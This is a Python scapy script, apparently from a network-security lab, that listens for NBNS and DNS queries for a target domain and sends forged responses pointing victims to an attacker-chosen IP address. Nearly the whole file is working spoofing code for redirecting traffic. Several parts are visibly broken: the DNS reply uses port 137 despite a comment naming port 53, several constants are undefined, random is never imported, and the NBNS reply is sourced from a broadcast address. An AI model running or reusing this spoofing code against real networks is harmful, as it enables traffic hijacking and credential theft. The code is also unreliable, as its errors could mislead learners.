from util import bcolors
from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, getmacbyip, NBNSQueryRequest, NBNSQueryResponse
from scapy.packet import Packet
from scapy.fields import (
    BitEnumField,
    IPField,
)


_NETBIOS_GNAMES = {
    0: "Unique name",
    1: "Group name"
}

_NETBIOS_OWNER_MODE_TYPES = {
    0: "B node",
    1: "P node",
    2: "M node",
    3: "H node"
}


class NBNS_ADD_ENTRY(Packet):
    fields_desc = [
        BitEnumField("G", 0, 1, _NETBIOS_GNAMES),
        BitEnumField("OWNER_NODE_TYPE", 00, 2,
                     _NETBIOS_OWNER_MODE_TYPES),
        BitEnumField("UNUSED", 0, 13, {0: "Unused"}),
        IPField("NB_ADDRESS", "192.168.56.102")
    ]


def nbns_callback(packet, dns_domain, dns_ip):
    ip_attacker = '192.168.56.103'

    # Requests on Windows XP are handled using NBNS (NetBIOS Name Service) instead of DNS. Rewrite the code below for NBNS spoofing.
    print('NBNS packet received. Checking if it is a query for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))

    # Check if the packet is an NBNS query
    if packet.haslayer(NBNSQueryRequest):
        # Check if the packet's NBNS query is for the domain name to be spoofed
        print('NBNS query received. Checking if it is for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
        print(packet[NBNSQueryRequest].QUESTION_NAME)
        print(packet[NBNSQueryRequest].show())
        
        # Use regex to see if the domain name is in the NBNS query
        if dns_domain in packet[NBNSQueryRequest].QUESTION_NAME.lower():
            print('NBNS query for {cyan}{domain}{endc} received. Sending spoofed NBNS response packet...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
            # Create a new NBNS packet
            nbns = Ether() / IP() / UDP() / NBNSQueryResponse()

            # Set the source and destination MAC and IP addresses (from attacker back to victim)
            nbns[Ether].src = getmacbyip('192.168.56.255')
            nbns[Ether].dst = packet[Ether].src
            nbns[IP].src = '192.168.56.255'
            nbns[IP].dst = packet[IP].src

            # Set the NBNS packet's source and destination port to 137, the NBNS port
            nbns[UDP].sport = 137
            nbns[UDP].dport = 137

            # Fill the NBNS packet's fields
            nbns[NBNSQueryResponse].RR_NAME = dns_domain
            nbns[NBNSQueryResponse].SUFFIX = 0x4141
            nbns[NBNSQueryResponse].NULL = 0
            nbns[NBNSQueryResponse].QUESTION_TYPE = 0x20
            nbns[NBNSQueryResponse].QUESTION_CLASS = 1
            nbns[NBNSQueryResponse].TTL = 0x493e0
            nbns[NBNSQueryResponse].RDLENGTH = 6
            nbns[NBNSQueryResponse].NB_ADDRESS = dns_ip

            print(nbns[NBNSQueryResponse].show())

            # Send the NBNS packet
            print('Sending spoofed NBNS packet...\n')
            sendp(nbns, iface=INTERFACE_NAME)

            print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))


def dns_callback(packet, dns_domain, dns_ip):
    """
    Callback function for DNS packets. Checks if the packet is a DNS query for the domain name
    to be spoofed. If so, it sends a forged DNS response packet.
    """
    ip_attacker = '192.168.56.103'
    
    print('DNS packet received. Checking if it is a query for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
    # Check if the packet is a DNS query
    if packet.haslayer(DNSQR):
        # Check if the packet's DNS query is for the domain name to be spoofed
        print('DNS query received. Checking if it is for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
        if dns_domain in packet[DNSQR].qname:
            print('DNS query for {cyan}{domain}{endc} received. Sending spoofed DNS packet...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
            # Create a new DNS packet
            dns = Ether() / IP() / UDP() / DNS()

            # Set the source and destination MAC and IP addresses (from attacker back to victim)
            dns[Ether].src = MAC_ATTACKER
            dns[Ether].dst = packet[Ether].src
            dns[IP].src = IP_ATTACKER
            dns[IP].dst = packet[IP].src

            # Set the DNS packet's source and destination port to 53, the DNS port
            dns[UDP].sport = 137
            dns[UDP].dport = 137

            # Set the DNS packet's transaction ID to a random number
            dns[DNS].id = random.randint(0, 65535)
            # Set the DNS packet's query to the domain name to be spoofed
            dns[DNS].qd = DNSQR(qname=dns_domain)
            # Set the DNS packet's answer to the IP address of your choice
            dns[DNS].an = DNSRR(rrname=dns_domain, rdata=dns_ip)

            # Send the DNS packet
            print('Sending spoofed DNS packet...\n')
            sendp(dns, iface=INTERFACE_NAME)

            print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))
